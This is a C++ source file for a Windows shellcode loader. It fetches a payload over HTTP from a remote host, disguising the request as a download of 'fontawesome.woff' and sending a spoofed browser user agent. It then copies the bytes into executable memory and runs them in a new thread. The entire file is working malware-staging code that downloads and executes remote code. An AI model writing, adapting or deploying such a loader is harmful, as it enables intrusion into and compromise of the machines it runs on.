#include "ShellcodeLoader.h"

ShellCode ShellcodeLoader::Download(LPCWSTR host, INTERNET_PORT port)
{
	
	HINTERNET hInternet = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET hConnect = InternetConnect(
		hInternet,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	DWORD dwTimeout = 5000;

	InternetSetOption(hConnect, INTERNET_OPTION_CONNECT_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
	InternetSetOption(hConnect, INTERNET_OPTION_SEND_TIMEOUT, &dwTimeout, sizeof(dwTimeout));

	HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/fontawesome.woff", NULL, NULL, NULL, 0, 0);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return {NULL,0};
	}

	if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0))
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return { NULL,0 };
	}

	const DWORD bufferSize = 1024;
	
	std::vector<BYTE> buffer(bufferSize);
	std::vector<BYTE> responseData;

	DWORD dwBytesRead = 0;

	do
	{
		if (!InternetReadFile(hRequest, &buffer[0], bufferSize, &dwBytesRead))
		{
			InternetCloseHandle(hRequest);
			InternetCloseHandle(hConnect);
			InternetCloseHandle(hInternet);
			return { NULL, 0 };
		}

		if (dwBytesRead > 0)
		{
			responseData.insert(responseData.end(), buffer.begin(), buffer.begin() + dwBytesRead);
		}

	}
	while (dwBytesRead > 0);

	ShellCode out;

	BYTE* dataCopy = new BYTE[responseData.size()];
	RtlMoveMemory(dataCopy, &responseData[0], responseData.size());

	out.data = dataCopy;
	out.len = responseData.size();

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	return out;
}

void ShellcodeLoader::ExecuteShellcode(ShellCode shellcode)
{
	
	LPVOID  pBuffer = NULL;
	HANDLE hThread = NULL;

	pBuffer = VirtualAlloc(NULL, shellcode.len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(pBuffer, shellcode.data, shellcode.len);
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pBuffer, NULL, NULL, 0);
	if (!hThread)
	{
		return;
	}

	WaitForSingleObject(hThread, -1);
	return;
}
